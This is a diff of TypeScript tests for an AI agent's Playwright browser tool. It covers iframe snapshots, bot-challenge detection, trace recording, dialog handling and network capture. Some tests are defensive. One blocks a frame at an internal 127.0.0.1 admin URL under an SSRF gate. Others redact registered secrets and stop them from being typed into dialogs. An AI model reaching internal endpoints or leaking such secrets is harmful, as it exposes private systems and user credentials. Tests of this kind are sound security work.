+
+      // In-frame content rows are present, indented under the iframe row,
+      // with refs of their own.
+      expect(result.text).toMatch(/\[@e\d+\] textbox "Card number"/);
+      expect(result.text).toMatch(/\[@e\d+\] button "Pay now"/);
+      expect(result.text).toMatch(/\[@e\d+\] button "Main action"/);
+
+      // The in-frame button's locator chains through frameLocator on the
+      // OWNING iframe's stamp, and the RefTarget is marked framed (no
+      // self-healing). The main-frame button stays a flat locator.
+      const frameRef = /\[(@e\d+)\] iframe /.exec(result.text)![1]!;
+      const payRef = /\[(@e\d+)\] button "Pay now"/.exec(result.text)![1]!;
+      const mainRef = /\[(@e\d+)\] button "Main action"/.exec(result.text)![1]!;
+      const payTarget = result.refs.get(payRef) as unknown as { locator: { __frame?: string; __sel?: string }; framed?: boolean };
+      expect(payTarget.framed).toBe(true);
+      expect(payTarget.locator.__frame).toBe(`[data-gini-ref="${frameRef.slice(1)}"]`);
+      expect(payTarget.locator.__sel).toBe(`[data-gini-ref="${payRef.slice(1)}"]`);
+      const mainTarget = result.refs.get(mainRef) as unknown as { locator: { __frame?: string }; framed?: boolean };
+      expect(mainTarget.framed).toBeUndefined();
+      expect(mainTarget.locator.__frame).toBeUndefined();
+    } finally {
+      restore();
+    }
+  });
+
+  test("cross-origin iframe (contentDocument throws) gets an opaque placeholder row", async () => {
+    const iframe = makeEl({
+      tagName: "IFRAME",
+      attrs: { src: "https://ads.example.net/frame", name: "ads" }
+    });
+    Object.defineProperty(iframe, "contentDocument", {
+      get() {
+        throw new Error("Blocked a frame with origin from accessing a cross-origin frame.");
+      }
+    });
+    const body = makeEl({ tagName: "BODY", children: [iframe] });
+    const restore = installFakeDom(body);
+    try {
+      const result = await browserTest.snapshotForTest(makeFakePage(), false);
+      expect(result.text).toContain('iframe "ads|https://ads.example.net/frame" [cross-origin]');
+      // Placeholder only: no ref on the row, nothing walked from inside.
+      expect(result.text).not.toMatch(/\[@e\d+\] iframe/);
+      expect(result.refs.size).toBe(0);
+    } finally {
+      restore();
+    }
+  });
+
+  test("a same-origin frame whose URL fails the SSRF gate is placeholder-only ([blocked], content stripped)", async () => {
+    const stealButton = makeEl({ tagName: "BUTTON", textContent: "Steal state" });
+    const frameBody = makeEl({ tagName: "BODY", children: [stealButton] });
+    const iframe = makeEl({
+      tagName: "IFRAME",
+      attrs: { src: "http://127.0.0.1:7777/admin" }
+    });
+    iframe.contentDocument = makeFrameDoc(frameBody, "http://127.0.0.1:7777/admin");
+    const okButton = makeEl({ tagName: "BUTTON", textContent: "Fine" });
+    const body = makeEl({ tagName: "BODY", children: [iframe, okButton] });
+    const restore = installFakeDom(body);
+    try {
+      const result = await browserTest.snapshotForTest(makeFakePage(), false);
+      expect(result.text).toContain('iframe "http://127.0.0.1:7777/admin" [blocked]');
+      // The blocked frame's content never reaches the snapshot text or
+      // the refs map; main-frame content is unaffected.
+      expect(result.text).not.toContain("Steal state");
+      expect(result.text).toMatch(/\[@e\d+\] button "Fine"/);
+      for (const target of result.refs.values()) {
+        expect((target as unknown as { framed?: boolean }).framed).toBeUndefined();
+      }
+    } finally {
+      restore();
+    }
+  });
+
+  test("hidden-element budget is shared across frames, not reset per frame", async () => {
+    const mainHidden: WalkerFakeEl[] = [];
+    for (let i = 0; i < 30; i++) {
+      mainHidden.push(makeEl({ tagName: "BUTTON", visible: false, textContent: `main-${i}` }));
+    }
+    const frameHidden: WalkerFakeEl[] = [];
+    for (let i = 0; i < 30; i++) {
+      frameHidden.push(makeEl({ tagName: "BUTTON", visible: false, textContent: `frame-${i}` }));
+    }
+    const frameBody = makeEl({ tagName: "BODY", children: frameHidden });
+    const iframe = makeEl({ tagName: "IFRAME", attrs: { src: "https://widgets.example.com/w" } });
+    iframe.contentDocument = makeFrameDoc(frameBody, "https://widgets.example.com/w");
+    const body = makeEl({ tagName: "BODY", children: [...mainHidden, iframe] });
+    const restore = installFakeDom(body);
+    try {
+      const result = await browserTest.snapshotForTest(makeFakePage(), false);
+      const hiddenLines = result.text.split("\n").filter((line) => line.includes("[hidden]") && !line.includes(" iframe "));
+      // 60 hidden across both documents against the shared budget of 50.
+      expect(hiddenLines.length).toBe(50);
+      expect(result.text).toContain("[...hidden truncated +10 more hidden]");
+    } finally {
+      restore();
+    }
+  });
+
+  test("a hidden iframe gets a placeholder row and is not walked", async () => {
+    const frameBody = makeEl({
+      tagName: "BODY",
+      children: [makeEl({ tagName: "BUTTON", textContent: "Inside hidden frame" })]
+    });
+    const iframe = makeEl({ tagName: "IFRAME", visible: false, attrs: { src: "https://tracker.example.com/px" } });
+    iframe.contentDocument = makeFrameDoc(frameBody, "https://tracker.example.com/px");
+    const body = makeEl({ tagName: "BODY", children: [iframe] });
+    const restore = installFakeDom(body);
+    try {
+      const result = await browserTest.snapshotForTest(makeFakePage(), false);
+      expect(result.text).toContain('iframe "https://tracker.example.com/px" [hidden]');
+      expect(result.text).not.toContain("Inside hidden frame");
+    } finally {
+      restore();
+    }
+  });
+
+  test("nth ordinals are frame-local so main-frame healing is not skewed by same-name framed entries", async () => {
+    // A framed "Submit" button is emitted BEFORE the main-frame one.
+    // Healing re-queries page.getByRole, which searches the main frame
+    // only — there the main-frame button is the first (and only) match,
+    // so its recorded nth must be 0, not inflated by the framed entry.
+    const frameButton = makeEl({ tagName: "BUTTON", textContent: "Submit" });
+    const frameBody = makeEl({ tagName: "BODY", children: [frameButton] });
+    const iframe = makeEl({ tagName: "IFRAME", attrs: { src: "https://forms.example.com/f" } });
+    iframe.contentDocument = makeFrameDoc(frameBody, "https://forms.example.com/f");
+    const mainButton = makeEl({ tagName: "BUTTON", textContent: "Submit" });
+    const body = makeEl({ tagName: "BODY", children: [iframe, mainButton] });
+    const restore = installFakeDom(body);
+    try {
+      const result = await browserTest.snapshotForTest(makeFakePage({ frameLocator: true }), false);
+      const targets = [...result.refs.values()] as Array<{ role: string; name: string; nth: number; framed?: boolean }>;
+      const framedSubmit = targets.find((t) => t.name === "Submit" && t.framed);
+      const mainSubmit = targets.find((t) => t.name === "Submit" && !t.framed);
+      expect(framedSubmit?.nth).toBe(0);
+      expect(mainSubmit?.nth).toBe(0);
+    } finally {
+      restore();
+    }
+  });
+
+  test("framed refs never self-heal: a lost in-frame stamp fails loudly without querying the main frame", async () => {
+    let healingQueried = 0;
+    const fakePage = {
+      url: () => "https://example.com/",
+      title: async () => "Example",
+      waitForLoadState: async () => undefined,
+      evaluate: async () => ({ entries: [], hiddenEmitted: 0, hiddenTotal: 0, hiddenBudget: 0 }),
+      getByRole: () => {
+        healingQueried++;
+        return { nth: () => ({ count: async () => 1 }) };
+      },
+      getByText: () => {
+        healingQueried++;
+        return { nth: () => ({ count: async () => 1 }) };
+      }
+    } as unknown as Partial<import("playwright-core").Page>;
+    browserTest.installFakeSessionWithPageForTest("framed-no-heal", fakePage);
+    const refs = new Map<string, unknown>();
+    // Stamp lost: count() resolves 0. A main-frame target would heal via
+    // getByRole; a framed target must fail instead.
+    refs.set("@e5", {
+      locator: { count: async () => 0, click: async () => undefined },
+      role: "button",
+      name: "Pay now",
+      nth: 0,
+      framed: true
+    });
+    browserTest.setFakeSessionRefsForTest("framed-no-heal", refs);
+    try {
+      const raw = await browserClick("framed-no-heal", { ref: "@e5" });
+      const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+      expect(parsed.success).toBe(false);
+      expect(parsed.error).toContain("Unknown ref @e5");
+      expect(healingQueried).toBe(0);
+    } finally {
+      browserTest.clearFakeSessionsForTest();
+      browserTest.setInFlightDisconnectsForTest(0);
+    }
+  });
+});
+
+// Bot-wall detection: a challenge interstitial (Cloudflare "Just a
+// moment...", captcha-provider iframes) never changes on re-snapshot, so
+// snapshot results must flag botWallSuspected + a warning that stops the
+// model from re-snapshotting in a loop. The heuristic requires a title
+// match or a challenge-provider iframe row — body text merely mentioning
+// CAPTCHAs must not trigger it.
+describe("bot-wall detection", () => {
+  const makeEl = makeWalkerEl;
+  const installFakeDom = installWalkerDom;
+  const makeFakePage = (title: string): import("playwright-core").Page =>
+    ({
+      url: () => "https://example.com/",
+      title: async () => title,
+      evaluate: <A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> => Promise.resolve(fn(arg as A)),
+      locator: (sel: string) => ({ __sel: sel } as unknown)
+    } as unknown as import("playwright-core").Page);
+
+  afterEach(() => {
+    browserTest.clearFakeSessionsForTest();
+    browserTest.setInFlightDisconnectsForTest(0);
+  });
+
+  test("Cloudflare-style interstitial title rides the snapshot result as botWallSuspected + warning", async () => {
+    const body = makeEl({ tagName: "BODY", children: [makeEl({ tagName: "BUTTON", textContent: "Retry" })] });
+    const restore = installFakeDom(body);
+    const page = makeFakePage("Just a moment...");
+    browserTest.installFakeSessionWithPageForTest("botwall-title", page as Partial<import("playwright-core").Page>);
+    try {
+      const raw = await browserSnapshot("botwall-title", {});
+      const parsed = JSON.parse(raw) as { success: boolean; botWallSuspected?: boolean; warning?: string };
+      expect(parsed.success).toBe(true);
+      expect(parsed.botWallSuspected).toBe(true);
+      expect(parsed.warning).toContain("bot-detection challenge");
+    } finally {
+      restore();
+    }
+  });
+
+  test("a captcha-provider iframe flags botWallSuspected even under a benign title", async () => {
+    // Cross-origin captcha frame: no contentDocument, so the walker emits
+    // an opaque placeholder row whose label carries the src.
+    const iframe = makeEl({
+      tagName: "IFRAME",
+      attrs: { src: "https://challenges.cloudflare.com/turnstile/v0/challenge", title: "Widget containing a security challenge" }
+    });
+    const body = makeEl({ tagName: "BODY", children: [iframe] });
+    const restore = installFakeDom(body);
+    try {
+      const result = await browserTest.snapshotForTest(makeFakePage("example.com"), false);
+      expect(result.botWallSuspected).toBe(true);
+    } finally {
+      restore();
+    }
+  });
+
+  test("a page merely mentioning CAPTCHAs in title-adjacent body text is not flagged", async () => {
+    // Article ABOUT captchas: the trigger phrase appears in a link's
+    // accessible name and the title names captchas, but there is no
+    // challenge title phrase and no challenge-provider iframe.
+    const link = makeEl({
+      tagName: "A",
+      attrs: { href: "https://blog.example.com/captcha" },
+      textContent: "Verify you are human — how CAPTCHAs work"
+    });
+    const body = makeEl({ tagName: "BODY", children: [link] });
+    const restore = installFakeDom(body);
+    try {
+      const result = await browserTest.snapshotForTest(makeFakePage("The history of CAPTCHA tests"), false);
+      expect(result.text).toContain("Verify you are human");
+      expect(result.botWallSuspected).toBe(false);
     } finally {
       restore();
     }
@@ -2131,6 +3060,244 @@ describe("ensureShared default headless persistent launch", () => {
   });
 });
 
+// Session-provider seam: acquisition (ensureShared) and release
+// (teardownHandle) must both dispatch through the provider registry, so a
+// future remote provider can swap the transport without touching the
+// in-process snapshot/redaction/SSRF layers above the seam.
+describe("browser session provider seam", () => {
+  afterEach(() => {
+    browserTest.setSessionProviderForTest("persistent", null);
+    browserTest.uninstallFakeBrowserForTest();
+    browserTest.clearFakeSessionsForTest();
+    browserTest.clearPendingSharedForTest();
+  });
+
+  test("ensureShared connects and teardown disconnects through the registered provider", async () => {
+    const fakePage = {
+      on: () => undefined,
+      close: () => Promise.resolve(),
+      goto: () => Promise.resolve(null),
+      url: () => "about:blank",
+      title: () => Promise.resolve(""),
+      evaluate: () => Promise.resolve([])
+    };
+    const fakeContext = {
+      pages: () => [],
+      newPage: async () => fakePage,
+      close: async () => undefined,
+      browser: () => ({ isConnected: () => true })
+    };
+    let connectCalls = 0;
+    const disconnectedKinds: string[] = [];
+    browserTest.setSessionProviderForTest("persistent", {
+      kind: "persistent",
+      connect: async () => {
+        connectCalls++;
+        return { kind: "persistent", context: fakeContext as never, headed: false };
+      },
+      disconnect: async (handle) => {
+        disconnectedKinds.push(handle.kind);
+      }
+    });
+
+    try {
+      // Snapshot wiring may throw on the fake page; only the provider
+      // dispatch is under test.
+      await browserNavigate("seam-task", { url: "https://example.com/" });
+    } catch {
+      // ignore
+    }
+    expect(connectCalls).toBe(1);
+
+    await disconnectSharedBrowser();
+    expect(disconnectedKinds).toEqual(["persistent"]);
+    // The shared slot was cleared by the provider-mediated teardown.
+    expect(browserTest.uninstallFakeBrowserForTest().kind).toBe(null);
+  });
+});
+
+// Opt-in session trace recording (RuntimeConfig.browserRecording): tracing
+// starts on session create only when enabled, stops + saves into the
+// instance-scoped browser-traces dir on session close (with an audit row),
+// and retention keeps only the newest TRACE_RETENTION_MAX archives.
+describe("browser session trace recording", () => {
+  const TEST_ROOT = "/tmp/gini-browser-trace-recording";
+
+  const makeTracingContext = () => {
+    const startCalls: Array<Record<string, unknown>> = [];
+    const stopCalls: Array<string | undefined> = [];
+    const fakePage = {
+      on: () => undefined,
+      close: () => Promise.resolve(),
+      goto: () => Promise.resolve(null),
+      url: () => "about:blank",
+      title: () => Promise.resolve(""),
+      evaluate: () => Promise.resolve([])
+    };
+    const context = {
+      pages: () => [],
+      newPage: async () => fakePage,
+      close: async () => undefined,
+      tracing: {
+        start: async (options: Record<string, unknown>) => {
+          startCalls.push(options);
+        },
+        stop: async (options?: { path?: string }) => {
+          stopCalls.push(options?.path);
+          if (options?.path) writeFileSync(options.path, "fake-trace-zip");
+        }
+      }
+    };
+    return { context, startCalls, stopCalls };
+  };
+
+  afterEach(() => {
+    mock.restore();
+    browserTest.resetSessionTraceForTest();
+    browserTest.uninstallFakeBrowserForTest();
+    browserTest.clearFakeSessionsForTest();
+    browserTest.clearPendingSharedForTest();
+    browserTest.resetChromiumImportForTest();
+    setBrowserInstance("dev");
+    rmSync(TEST_ROOT, { recursive: true, force: true });
+  });
+
+  test("enabled: tracing starts on session create and stop saves + audits on session close", async () => {
+    process.env["GINI_STATE_ROOT"] = TEST_ROOT;
+    const instance = `trace-on-${process.pid}`;
+    rmSync(`${TEST_ROOT}/instances/${instance}`, { recursive: true, force: true });
+    setBrowserInstance(instance);
+    setBrowserRecording(true);
+
+    const { context, startCalls, stopCalls } = makeTracingContext();
+    mock.module("playwright-core", () => ({
+      chromium: {
+        executablePath: () => "/fake/path/to/chromium",
+        launchPersistentContext: async () => context
+      }
+    }));
+    browserTest.resetChromiumImportForTest();
+
+    try {
+      await browserNavigate("trace-task", { url: "https://example.com/" });
+    } catch {
+      // Snapshot wiring may throw on the fake page; tracing is what's pinned.
+    }
+    expect(startCalls).toEqual([{ screenshots: true, snapshots: true }]);
+    expect(browserTest.activeTraceTaskIdForTest()).toBe("trace-task");
+
+    await browserTest.closeSessionForTest("trace-task");
+    expect(stopCalls.length).toBe(1);
+    const savedPath = stopCalls[0]!;
+    expect(savedPath).toContain(`/instances/${instance}/browser-traces/`);
+    expect(savedPath).toContain("trace-task");
+    expect(savedPath.endsWith(".zip")).toBe(true);
+    expect(existsSync(savedPath)).toBe(true);
+    expect(browserTest.activeTraceTaskIdForTest()).toBe(null);
+    // The save wrote a browser.trace_saved audit row pointing at the archive.
+    const audit = readState(instance).audit.find((row) => row.action === "browser.trace_saved");
+    expect(audit?.target).toBe(savedPath);
+    expect(audit?.taskId).toBe("trace-task");
+    expect(audit?.evidence?.["sizeBytes"]).toBe("fake-trace-zip".length);
+  });
+
+  test("disabled (default): no tracing calls on create or close", async () => {
+    process.env["GINI_STATE_ROOT"] = TEST_ROOT;
+    const instance = `trace-off-${process.pid}`;
+    rmSync(`${TEST_ROOT}/instances/${instance}`, { recursive: true, force: true });
+    setBrowserInstance(instance);
+    // Deliberately no setBrowserRecording(true) — off is the default.
+
+    const { context, startCalls, stopCalls } = makeTracingContext();
+    mock.module("playwright-core", () => ({
+      chromium: {
+        executablePath: () => "/fake/path/to/chromium",
+        launchPersistentContext: async () => context
+      }
+    }));
+    browserTest.resetChromiumImportForTest();
+
+    try {
+      await browserNavigate("trace-off-task", { url: "https://example.com/" });
+    } catch {
+      // ignore — see above.
+    }
+    await browserTest.closeSessionForTest("trace-off-task");
+
+    expect(startCalls.length).toBe(0);
+    expect(stopCalls.length).toBe(0);
+    expect(readState(instance).audit.some((row) => row.action === "browser.trace_saved")).toBe(false);
+  });
+
+  test("retention prunes to the newest 10 trace archives", () => {
+    const dir = join(TEST_ROOT, "prune");
+    mkdirSync(dir, { recursive: true });
+    // 13 archives with strictly increasing mtimes, plus a non-zip bystander.
+    const base = Date.now() / 1000 - 1000;
+    for (let i = 0; i < 13; i++) {
+      const path = join(dir, `trace-${String(i).padStart(2, "0")}.zip`);
+      writeFileSync(path, "x");
+      utimesSync(path, base + i, base + i);
+    }
+    writeFileSync(join(dir, "notes.txt"), "not a trace");
+
+    browserTest.pruneTraceFilesForTest(dir);
+
+    const remaining = readdirSync(dir).sort();
+    expect(remaining.filter((name) => name.endsWith(".zip")).length).toBe(10);
+    // The three OLDEST archives were deleted; the newest survive.
+    expect(remaining).not.toContain("trace-00.zip");
+    expect(remaining).not.toContain("trace-01.zip");
+    expect(remaining).not.toContain("trace-02.zip");
+    expect(remaining).toContain("trace-03.zip");
+    expect(remaining).toContain("trace-12.zip");
+    // Non-zip files are never touched.
+    expect(remaining).toContain("notes.txt");
+  });
+});
+
+// browser_vision native-image fast-path gate: the screenshot may enter the
+// conversation directly ONLY when the active model accepts image input AND
+// no secrets are registered for ANY active task (raw pixels cannot be
+// post-OCR-redacted, so the union registry must be empty). No provider
+// tool-result serializer can carry an image part yet, so browserVision
+// still routes every call through the aux side-call — this suite pins the
+// gate decision itself.
+describe("browser_vision native-image route gate", () => {
+  const configFor = (provider: RuntimeConfig["provider"]): RuntimeConfig => ({
+    instance: "test",
+    port: 7337,
+    token: "test",
+    provider,
+    workspaceRoot: "/tmp",
+    stateRoot: "/tmp/gini-vision-route-test",
+    logRoot: "/tmp/gini-vision-route-test-logs"
+  });
+
+  afterEach(() => {
+    browserTest.resetFilledSecretsForTest();
+  });
+
+  test("vision-capable model + empty cross-task secret registry → native-image", () => {
+    const route = browserTest.resolveVisionRouteForTest(configFor({ name: "anthropic", model: "claude-sonnet-4-5" }));
+    expect(route).toBe("native-image");
+  });
+
+  test("a secret registered by ANY task forces the aux side-call even on a vision-capable model", () => {
+    // The registering task is unrelated to the vision caller — the gate
+    // reads the cross-task union (shared BrowserContext can surface one
+    // task's credential on another task's page).
+    browserTest.recordFilledSecretForTest("unrelated-task", "hunter2-long-secret");
+    const route = browserTest.resolveVisionRouteForTest(configFor({ name: "anthropic", model: "claude-sonnet-4-5" }));
+    expect(route).toBe("aux-side-call");
+  });
+
+  test("a model without vision capability stays on the aux side-call", () => {
+    const route = browserTest.resolveVisionRouteForTest(configFor({ name: "echo", model: "gini-echo-v0" }));
+    expect(route).toBe("aux-side-call");
+  });
+});
+
 // browser_vision: screenshots the current page and asks the configured vision
 // model a question. We install a fake session with a stub `page.screenshot`
 // so we don't need a real Chromium, and route the provider through the echo
@@ -2724,6 +3891,585 @@ describe("browserDrag", () => {
     expect(JSON.parse(rawMissingFrom).error).toMatch(/fromRef/);
     const rawMissingTo = await browserDrag("drag-noargs", { fromRef: "@e1" });
     expect(JSON.parse(rawMissingTo).error).toMatch(/toRef/);
+  });
+});
+
+// Dialog capture without Chromium: a fake page records the "dialog"
+// listener attachDialogHandler installs, and tests fire fake Dialog
+// objects through it. Surfacing rides ok()'s `dialogs` merge, exercised
+// through real tool entry points (browserSnapshot / browserDialog).
+describe("browser dialog capture and browser_dialog", () => {
+  afterEach(() => {
+    browserTest.clearFakeSessionsForTest();
+    browserTest.resetFilledSecretsForTest();
+    browserTest.setInFlightDisconnectsForTest(0);
+  });
+
+  function makeDialogPage(url = "https://example.com/") {
+    const handlers = new Map<string, (arg: unknown) => void>();
+    const page = {
+      ...makeFakePageForRefTools(url),
+      on: (event: string, cb: (arg: unknown) => void) => {
+        handlers.set(event, cb);
+      }
+    };
+    return { page: page as unknown as import("playwright-core").Page, handlers };
+  }
+
+  function makeFakeDialog(over: Partial<{ type: string; message: string; defaultValue: string }> = {}) {
+    const responses: string[] = [];
+    const dialog = {
+      type: () => over.type ?? "confirm",
+      message: () => over.message ?? "Are you sure?",
+      defaultValue: () => over.defaultValue ?? "",
+      accept: async (text?: string) => {
+        responses.push(`accept:${text ?? ""}`);
+      },
+      dismiss: async () => {
+        responses.push("dismiss");
+      }
+    };
+    return { dialog, responses };
+  }
+
+  test("an unarmed dialog is auto-dismissed, recorded, and surfaced once in the next tool result", async () => {
+    const { page, handlers } = makeDialogPage();
+    browserTest.installFakeSessionWithPageForTest("dlg-task", page as Partial<import("playwright-core").Page>);
+    browserTest.attachDialogHandlerForTest("dlg-task", page);
+    const { dialog, responses } = makeFakeDialog({ message: "Delete this item?" });
+    handlers.get("dialog")!(dialog);
+    expect(responses).toEqual(["dismiss"]);
+
+    const raw = await browserSnapshot("dlg-task", {});
+    const parsed = JSON.parse(raw) as {
+      success: boolean;
+      dialogs?: Array<{ type: string; message: string; url: string; response: string }>;
+    };
+    expect(parsed.success).toBe(true);
+    expect(parsed.dialogs).toHaveLength(1);
+    expect(parsed.dialogs![0]!.type).toBe("confirm");
+    expect(parsed.dialogs![0]!.message).toBe("Delete this item?");
+    expect(parsed.dialogs![0]!.url).toBe("https://example.com/");
+    expect(parsed.dialogs![0]!.response).toBe("dismissed");
+
+    // Reported exactly once: the next result carries no dialogs field.
+    const second = JSON.parse(await browserSnapshot("dlg-task", {})) as { dialogs?: unknown };
+    expect(second.dialogs).toBeUndefined();
+  });
+
+  test("browser_dialog arms a one-shot accept (with promptText) consumed by the next dialog only", async () => {
+    const { page, handlers } = makeDialogPage();
+    browserTest.installFakeSessionWithPageForTest("dlg-arm", page as Partial<import("playwright-core").Page>);
+    browserTest.attachDialogHandlerForTest("dlg-arm", page);
+
+    const armed = JSON.parse(await browserDialog("dlg-arm", { action: "accept", promptText: "Shelden" })) as {
+      success: boolean;
+      armed?: string;
+      promptText?: string;
+    };
+    expect(armed.success).toBe(true);
+    expect(armed.armed).toBe("accept");
+    expect(armed.promptText).toBe("Shelden");
+
+    const first = makeFakeDialog({ type: "prompt", message: "Your name?", defaultValue: "anon" });
+    handlers.get("dialog")!(first.dialog);
+    expect(first.responses).toEqual(["accept:Shelden"]);
+
+    // One-shot: a second dialog falls back to the default dismiss.
+    const second = makeFakeDialog({ message: "Leave page?" });
+    handlers.get("dialog")!(second.dialog);
+    expect(second.responses).toEqual(["dismiss"]);
+
+    const raw = JSON.parse(await browserSnapshot("dlg-arm", {})) as {
+      dialogs?: Array<{ type: string; response: string; promptText?: string; defaultValue?: string }>;
+    };
+    expect(raw.dialogs).toHaveLength(2);
+    expect(raw.dialogs![0]!.response).toBe("accepted");
+    expect(raw.dialogs![0]!.promptText).toBe("Shelden");
+    expect(raw.dialogs![0]!.defaultValue).toBe("anon");
+    expect(raw.dialogs![1]!.response).toBe("dismissed");
+  });
+
+  test("browser_dialog rejects an unknown action", async () => {
+    const { page } = makeDialogPage();
+    browserTest.installFakeSessionWithPageForTest("dlg-bad", page as Partial<import("playwright-core").Page>);
+    const parsed = JSON.parse(await browserDialog("dlg-bad", { action: "retry" })) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(parsed.error).toContain("accept, dismiss");
+  });
+
+  test("the unreported buffer is capped at the most recent 5 dialogs", async () => {
+    const { page, handlers } = makeDialogPage();
+    browserTest.installFakeSessionWithPageForTest("dlg-cap", page as Partial<import("playwright-core").Page>);
+    browserTest.attachDialogHandlerForTest("dlg-cap", page);
+    for (let i = 1; i <= 7; i++) {
+      handlers.get("dialog")!(makeFakeDialog({ message: `dialog ${i}` }).dialog);
+    }
+    const records = browserTest.peekUnreportedDialogsForTest("dlg-cap");
+    expect(records).toHaveLength(5);
+    expect(records[0]!.message).toBe("dialog 3");
+    expect(records[4]!.message).toBe("dialog 7");
+  });
+
+  test("an adopted page resolves dialogs against the task that owns it now, not the hooking task", async () => {
+    const { page, handlers } = makeDialogPage();
+    browserTest.installFakeSessionWithPageForTest("dlg-owner-a", page as Partial<import("playwright-core").Page>);
+    browserTest.attachDialogHandlerForTest("dlg-owner-a", page);
+    // The page survives task A and is adopted by task B: the re-attach
+    // refreshes ownership without installing a second listener.
+    browserTest.clearFakeSessionsForTest();
+    browserTest.installFakeSessionWithPageForTest("dlg-owner-b", page as Partial<import("playwright-core").Page>);
+    browserTest.attachDialogHandlerForTest("dlg-owner-b", page);
+
+    // Task B arms an accept; the next dialog must consume B's arming even
+    // though the listener was installed while task A owned the page.
+    const armed = JSON.parse(await browserDialog("dlg-owner-b", { action: "accept" })) as { success: boolean };
+    expect(armed.success).toBe(true);
+    const { dialog, responses } = makeFakeDialog({ message: "Proceed?" });
+    handlers.get("dialog")!(dialog);
+    expect(responses).toEqual(["accept:"]);
+
+    // The record lands in B's buffer, not the dead task A's.
+    expect(browserTest.peekUnreportedDialogsForTest("dlg-owner-a")).toHaveLength(0);
+    expect(browserTest.peekUnreportedDialogsForTest("dlg-owner-b")).toHaveLength(1);
+  });
+
+  test("browser_dialog refuses a promptText containing a registered secret and arms nothing", async () => {
+    const { page, handlers } = makeDialogPage();
+    browserTest.installFakeSessionWithPageForTest("dlg-secret-arm", page as Partial<import("playwright-core").Page>);
+    browserTest.attachDialogHandlerForTest("dlg-secret-arm", page);
+    browserTest.recordFilledSecretForTest("dlg-secret-arm", "hunter2secret");
+
+    const raw = await browserDialog("dlg-secret-arm", { action: "accept", promptText: "pw: hunter2secret" });
+    expect(raw).not.toContain("hunter2secret");
+    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(parsed.error).toContain("registered secret");
+
+    // Nothing was armed: the next dialog takes the default dismiss path
+    // and never receives the prompt text.
+    const { dialog, responses } = makeFakeDialog({ type: "prompt", message: "Password?" });
+    handlers.get("dialog")!(dialog);
+    expect(responses).toEqual(["dismiss"]);
+  });
+
+  test("a registered secret inside the dialog message is redacted in the surfaced record", async () => {
+    const { page, handlers } = makeDialogPage();
+    browserTest.installFakeSessionWithPageForTest("dlg-redact", page as Partial<import("playwright-core").Page>);
+    browserTest.attachDialogHandlerForTest("dlg-redact", page);
+    browserTest.recordFilledSecretForTest("dlg-redact", "hunter2secret");
+    handlers.get("dialog")!(makeFakeDialog({ message: "Submit hunter2secret to continue?" }).dialog);
+
+    // Surface through browser_dialog's own ok() result — same envelope
+    // every browser tool uses, so the deep-redaction pass applies.
+    const raw = await browserDialog("dlg-redact", { action: "dismiss" });
+    expect(raw).not.toContain("hunter2secret");
+    const parsed = JSON.parse(raw) as { dialogs?: Array<{ message: string }> };
+    expect(parsed.dialogs).toHaveLength(1);
+    expect(parsed.dialogs![0]!.message).toBe("Submit [redacted] to continue?");
+  });
+});
+
+// Network capture without Chromium: a fake page records the "response" /
+// "requestfailed" listeners attachNetworkCapture installs, and tests fire
+// fake event objects through them, then read the buffer via the
+// browser_requests tool itself.
+describe("browser network capture and browser_requests", () => {
+  afterEach(() => {
+    browserTest.clearFakeSessionsForTest();
+    browserTest.resetFilledSecretsForTest();
+    browserTest.setInFlightDisconnectsForTest(0);
+  });
+
+  function makeNetworkPage(url = "https://example.com/") {
+    const handlers = new Map<string, (arg: unknown) => void>();
+    const page = {
+      ...makeFakePageForRefTools(url),
+      on: (event: string, cb: (arg: unknown) => void) => {
+        handlers.set(event, cb);
+      }
+    };
+    return { page: page as unknown as import("playwright-core").Page, handlers };
+  }
+
+  function fakeResponse(url: string, status = 200, method = "GET", resourceType = "fetch") {
+    return {
+      url: () => url,
+      status: () => status,
+      request: () => ({ method: () => method, resourceType: () => resourceType })
+    };
+  }
+
+  function fakeFailedRequest(url: string, errorText: string, method = "GET", resourceType = "fetch") {
+    return {
+      url: () => url,
+      method: () => method,
+      resourceType: () => resourceType,
+      failure: () => ({ errorText })
+    };
+  }
+
+  test("records responses and failures in order and returns them via browser_requests", async () => {
+    const { page, handlers } = makeNetworkPage();
+    browserTest.installFakeSessionWithPageForTest("net-task", page as Partial<import("playwright-core").Page>);
+    browserTest.attachNetworkCaptureForTest("net-task", page);
+    handlers.get("response")!(fakeResponse("https://api.example.com/items", 200, "GET", "fetch"));
+    handlers.get("response")!(fakeResponse("https://api.example.com/save", 500, "POST", "xhr"));
+    handlers.get("requestfailed")!(fakeFailedRequest("https://cdn.example.com/app.js", "net::ERR_CONNECTION_REFUSED", "GET", "script"));
+
+    const raw = await browserRequests("net-task", {});
+    const parsed = JSON.parse(raw) as {
+      success: boolean;
+      requests?: Array<{ method: string; url: string; status: number | null; resourceType: string; failure?: string }>;
+    };
+    expect(parsed.success).toBe(true);
+    expect(parsed.requests).toHaveLength(3);
+    expect(parsed.requests![0]).toEqual({ method: "GET", url: "https://api.example.com/items", status: 200, resourceType: "fetch" });
+    expect(parsed.requests![1]).toEqual({ method: "POST", url: "https://api.example.com/save", status: 500, resourceType: "xhr" });
+    expect(parsed.requests![2]).toEqual({
+      method: "GET",
+      url: "https://cdn.example.com/app.js",
+      status: null,
+      resourceType: "script",
+      failure: "net::ERR_CONNECTION_REFUSED"
+    });
+  });
+
+  test("the ring buffer keeps only the most recent 100 entries", async () => {
+    const { page, handlers } = makeNetworkPage();
+    browserTest.installFakeSessionWithPageForTest("net-cap", page as Partial<import("playwright-core").Page>);
+    browserTest.attachNetworkCaptureForTest("net-cap", page);
+    for (let i = 1; i <= 105; i++) {
+      handlers.get("response")!(fakeResponse(`https://example.com/r/${i}`));
+    }
+    const parsed = JSON.parse(await browserRequests("net-cap", {})) as { requests?: Array<{ url: string }> };
+    expect(parsed.requests).toHaveLength(100);
+    expect(parsed.requests![0]!.url).toBe("https://example.com/r/6");
+    expect(parsed.requests![99]!.url).toBe("https://example.com/r/105");
+  });
+
+  test("filter narrows by URL substring", async () => {
+    const { page, handlers } = makeNetworkPage();
+    browserTest.installFakeSessionWithPageForTest("net-filter", page as Partial<import("playwright-core").Page>);
+    browserTest.attachNetworkCaptureForTest("net-filter", page);
+    handlers.get("response")!(fakeResponse("https://api.example.com/items"));
